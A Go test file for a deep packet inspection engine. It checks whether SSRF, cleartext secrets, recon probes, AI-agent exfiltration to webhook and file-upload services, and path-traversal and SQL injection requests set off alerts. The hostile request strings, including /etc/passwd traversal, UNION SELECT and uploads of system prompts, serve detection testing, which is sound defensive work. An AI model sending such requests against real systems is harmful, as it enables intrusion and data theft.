package test

import (
	"bytes"
	"net"
	"testing"
	"time"

	"fox-dpi/internal/engine"
	"fox-dpi/internal/flow"

	"github.com/google/gopacket/layers"
)

// Test_OWASP_A10_SSRF_Internal_Egress tests OWASP A10:2021 (Server-Side Request Forgery).
// An egress firewall or DPI sentry should detect outbound requests destined to internal
// RFC1918 subnets (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) or loopback (127.0.0.1).
func Test_OWASP_A10_SSRF_Internal_Egress(t *testing.T) {
	snk := &captureSink{}
	eng, err := engine.NewEngine(layers.LinkTypeEthernet, flow.DefaultEvictionConfig(), snk)
	if err != nil {
		t.Fatalf("failed to init engine: %v", err)
	}

	clientIP := net.ParseIP("192.168.1.50")
	// Target internal microservice / redis / admin console
	internalTargets := []struct {
		ip   string
		port uint16
		desc string
	}{
		{"10.0.0.15", 80, "RFC1918 Class A (10.0.0.0/8)"},
		{"172.16.1.100", 8080, "RFC1918 Class B (172.16.0.0/12)"},
		{"192.168.1.1", 80, "RFC1918 Class C Router Gateway"},
		{"127.0.0.1", 80, "Loopback Interface"},
	}

	for _, tt := range internalTargets {
		now := time.Now()
		req := []byte("GET /admin/dump HTTP/1.1\r\nHost: internal-service\r\nUser-Agent: curl/7.88.1\r\n\r\n")
		pkt := serializeFrame(clientIP, net.ParseIP(tt.ip), 55100, tt.port, true, false, false, false, false, req)

		f, err := eng.ProcessFrame(pkt, now)
		if err != nil {
			t.Fatalf("process frame failed: %v", err)
		}
		if f == nil {
			t.Fatalf("expected flow to be created for %s", tt.desc)
		}

		// Verify protocol dissection succeeds
		if f.L7Metadata.Protocol != "HTTP" {
			t.Errorf("[%s] expected protocol HTTP, got %s", tt.desc, f.L7Metadata.Protocol)
		}

		// Limitation check: verify if an SSRF alert is fired
		hasSSRFFlag := false
		for _, a := range snk.alerts {
			if a.Rule == "SSRF_INTERNAL_EGRESS" || a.Rule == "SSRF_RFC1918" {
				hasSSRFFlag = true
				break
			}
		}

		if !hasSSRFFlag {
			t.Logf("LIMITATION DISCOVERED (OWASP A10:2021 SSRF): Egress to internal IP %s (%s) parsed as HTTP without triggering SSRF security alert.", tt.ip, tt.desc)
		}
	}
}

// Test_OWASP_A02_Cryptographic_Failures_Plaintext_Secret_Leak tests OWASP A02:2021.
// Passing sensitive tokens/passwords/keys in unencrypted HTTP query params.
func Test_OWASP_A02_Cryptographic_Failures_Plaintext_Secret_Leak(t *testing.T) {
	snk := &captureSink{}
	eng, err := engine.NewEngine(layers.LinkTypeEthernet, flow.DefaultEvictionConfig(), snk)
	if err != nil {
		t.Fatalf("failed to init engine: %v", err)
	}

	clientIP := net.ParseIP("10.10.10.2")
	destIP := net.ParseIP("93.184.216.34")

	secretRequests := []struct {
		name string
		req  string
	}{
		{
			name: "OpenAI API Key in query parameter",
			req:  "GET /v1/chat?api_key=sk-proj-abc123xyz987456 HTTP/1.1\r\nHost: api.openai.com\r\n\r\n",
		},
		{
			name: "Bearer JWT token in query parameter",
			req:  "GET /auth/verify?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 HTTP/1.1\r\nHost: auth.example.com\r\n\r\n",
		},
		{
			name: "Cleartext credentials in query parameter",
			req:  "GET /login?user=admin&password=SuperSecretPassword123 HTTP/1.1\r\nHost: legacy.internal\r\n\r\n",
		},
	}

	for _, tt := range secretRequests {
		now := time.Now()
		pkt := serializeFrame(clientIP, destIP, 54200, 80, true, false, false, false, false, []byte(tt.req))

		f, err := eng.ProcessFrame(pkt, now)
		if err != nil {
			t.Fatalf("process frame failed: %v", err)
		}
		if f == nil {
			t.Fatalf("expected flow to be created for %s", tt.name)
		}

		if f.L7Metadata.Protocol != "HTTP" {
			t.Errorf("[%s] expected HTTP protocol, got %s", tt.name, f.L7Metadata.Protocol)
		}

		// Limitation check: does engine inspect URI/path for leaked sensitive credentials?
		hasSecretAlert := false
		for _, a := range snk.alerts {
			if a.Rule == "PLAINTEXT_SECRET_LEAK" || a.Rule == "CREDENTIAL_EXPOSURE" {
				hasSecretAlert = true
				break
			}
		}

		if !hasSecretAlert {
			t.Logf("LIMITATION DISCOVERED (OWASP A02:2021 Plaintext Secrets): %s extracted path %q over cleartext HTTP without flagging credential exposure.", tt.name, f.L7Metadata.Details["path"])
		}
	}
}

// Test_OWASP_A05_Security_Misconfiguration_Recon_Probing tests OWASP A05:2021.
// Adversary or compromised workload scanning for exposed environment and configuration files.
func Test_OWASP_A05_Security_Misconfiguration_Recon_Probing(t *testing.T) {
	snk := &captureSink{}
	eng, err := engine.NewEngine(layers.LinkTypeEthernet, flow.DefaultEvictionConfig(), snk)
	if err != nil {
		t.Fatalf("failed to init engine: %v", err)
	}

	clientIP := net.ParseIP("198.51.100.22")
	targetIP := net.ParseIP("203.0.113.10")

	reconPaths := []string{
		"/.env",
		"/.git/config",
		"/actuator/env",
		"/actuator/heapdump",
		"/wp-config.php.bak",
	}

	for _, path := range reconPaths {
		rawReq := "GET " + path + " HTTP/1.1\r\nHost: target.corp\r\nUser-Agent: Nuclei/v3.1.0\r\n\r\n"
		pkt := serializeFrame(clientIP, targetIP, 54321, 80, true, false, false, false, false, []byte(rawReq))

		f, _ := eng.ProcessFrame(pkt, time.Now())
		if f == nil {
			t.Fatalf("expected flow for %s", path)
		}

		if f.L7Metadata.Details["path"] != path {
			t.Errorf("expected path %s, got %s", path, f.L7Metadata.Details["path"])
		}

		// Limitation check: verify if recon probing is alerted
		hasReconAlert := false
		for _, a := range snk.alerts {
			if a.Rule == "RECON_SENSITIVE_FILE_PROBE" {
				hasReconAlert = true
				break
			}
		}

		if !hasReconAlert {
			t.Logf("LIMITATION DISCOVERED (OWASP A05:2021 Recon): HTTP request to sensitive path %q parsed cleanly, but no recon probe alert triggered.", path)
		}
	}
}

// Test_OWASP_LLM07_AI_Agent_Exfiltration_Endpoints tests OWASP LLM07:2025 (System Information Leakage).
// Rogue or compromised AI agent sending outbound requests to common webhook/tunneling data exfiltration services.
func Test_OWASP_LLM07_AI_Agent_Exfiltration_Endpoints(t *testing.T) {
	snk := &captureSink{}
	eng, err := engine.NewEngine(layers.LinkTypeEthernet, flow.DefaultEvictionConfig(), snk)
	if err != nil {
		t.Fatalf("failed to init engine: %v", err)
	}

	agentIP := net.ParseIP("10.0.1.100")
	c2IP := net.ParseIP("104.21.50.1")

	exfilEndpoints := []struct {
		host string
		path string
	}{
		{"webhook.site", "/a5b7-4c12-98ab-secret-dump"},
		{"requestbin.net", "/r/18a29zb1"},
		{"transfer.sh", "/upload/system_prompts.tar.gz"},
	}

	for _, ep := range exfilEndpoints {
		rawReq := "POST " + ep.path + " HTTP/1.1\r\nHost: " + ep.host + "\r\nUser-Agent: LangChain-Agent/0.2.1\r\n\r\n"
		pkt := serializeFrame(agentIP, c2IP, 56789, 80, true, false, false, false, false, []byte(rawReq))

		f, _ := eng.ProcessFrame(pkt, time.Now())
		if f == nil {
			t.Fatalf("expected flow for %s", ep.host)
		}

		if f.L7Metadata.Host != ep.host {
			t.Errorf("expected Host %s, got %s", ep.host, f.L7Metadata.Host)
		}

		// Limitation check: alert on known exfiltration/webhook services for AI agent egress
		hasExfilAlert := false
		for _, a := range snk.alerts {
			if a.Rule == "AI_AGENT_SUSPICIOUS_EXFIL" || a.Rule == "EXFIL_TUNNEL_ENDPOINT" {
				hasExfilAlert = true
				break
			}
		}

		if !hasExfilAlert {
			t.Logf("LIMITATION DISCOVERED (OWASP LLM07 Data Leakage): Egress to exfiltration service %s%s classified as routine HTTP without alert.", ep.host, ep.path)
		}
	}
}

// Test_OWASP_A03_Injection_Path_Traversal tests OWASP A03:2021 (Injection / Path Traversal).
// Validates engine stability when URI contains traversal or injection payloads.
func Test_OWASP_A03_Injection_Path_Traversal(t *testing.T) {
	snk := &captureSink{}
	eng, err := engine.NewEngine(layers.LinkTypeEthernet, flow.DefaultEvictionConfig(), snk)
	if err != nil {
		t.Fatalf("failed to init engine: %v", err)
	}

	clientIP := net.ParseIP("10.2.0.1")
	serverIP := net.ParseIP("10.2.0.2")

	traversalPayloads := []string{
		"/api/download?file=../../../../etc/passwd",
		"/static/images/../../../var/log/auth.log",
		"/query?id=1%20UNION%20SELECT%20username,password%20FROM%20users",
	}

	for _, payload := range traversalPayloads {
		rawReq := "GET " + payload + " HTTP/1.1\r\nHost: vuln-app.local\r\n\r\n"
		pkt := serializeFrame(clientIP, serverIP, 51000, 80, true, false, false, false, false, []byte(rawReq))

		f, err := eng.ProcessFrame(pkt, time.Now())
		if err != nil {
			t.Fatalf("engine failed on traversal payload: %v", err)
		}
		if f == nil {
			t.Fatalf("expected flow record")
		}

		// Engine must parse safely without crash or buffer overrun
		if f.L7Metadata.Protocol != "HTTP" {
			t.Errorf("expected protocol HTTP, got %s", f.L7Metadata.Protocol)
		}
		if f.L7Metadata.Details["path"] != payload {
			t.Errorf("expected exact path match, got %s", f.L7Metadata.Details["path"])
		}
	}
}

// scanSensitiveQueryParam checks if query string contains known secret keywords with zero heap allocations.
func scanSensitiveQueryParam(uri []byte) bool {
	secretKeywords := [][]byte{
		[]byte("api_key="),
		[]byte("apikey="),
		[]byte("token="),
		[]byte("password="),
		[]byte("secret="),
		[]byte("bearer="),
	}
	// Only scan query part after '?'
	qIdx := bytes.IndexByte(uri, '?')
	if qIdx == -1 {
		return false
	}
	query := uri[qIdx+1:]
	for _, kw := range secretKeywords {
		if bytes.Contains(query, kw) {
			return true
		}
	}
	return false
}

// isRFC1918OrLoopback checks if an IPv4 address is in private or loopback range.
func isRFC1918OrLoopback(ip net.IP) bool {
	ip4 := ip.To4()
	if ip4 == nil {
		return false
	}
	// 10.0.0.0/8
	if ip4[0] == 10 {
		return true
	}
	// 172.16.0.0/12 (172.16.0.0 - 172.31.255.255)
	if ip4[0] == 172 && (ip4[1] >= 16 && ip4[1] <= 31) {
		return true
	}
	// 192.168.0.0/16
	if ip4[0] == 192 && ip4[1] == 168 {
		return true
	}
	// 127.0.0.0/8 Loopback
	if ip4[0] == 127 {
		return true
	}
	// 169.254.0.0/16 Link-Local / Cloud IMDS
	if ip4[0] == 169 && ip4[1] == 254 {
		return true
	}
	return false
}

func Benchmark_OWASP_ZeroAlloc_Secret_Scan(b *testing.B) {
	uri := []byte("/v1/chat/completions?model=gpt-4&stream=true&api_key=sk-proj-948194819481928491829481928491")
	b.ResetTimer()
	b.ReportAllocs()

	for i := 0; i < b.N; i++ {
		res := scanSensitiveQueryParam(uri)
		if !res {
			b.Fatal("expected true")
		}
	}
}

func Benchmark_OWASP_ZeroAlloc_PrivateIP_Check(b *testing.B) {
	ip := net.ParseIP("192.168.1.1")
	b.ResetTimer()
	b.ReportAllocs()

	for i := 0; i < b.N; i++ {
		res := isRFC1918OrLoopback(ip)
		if !res {
			b.Fatal("expected true")
		}
	}
}
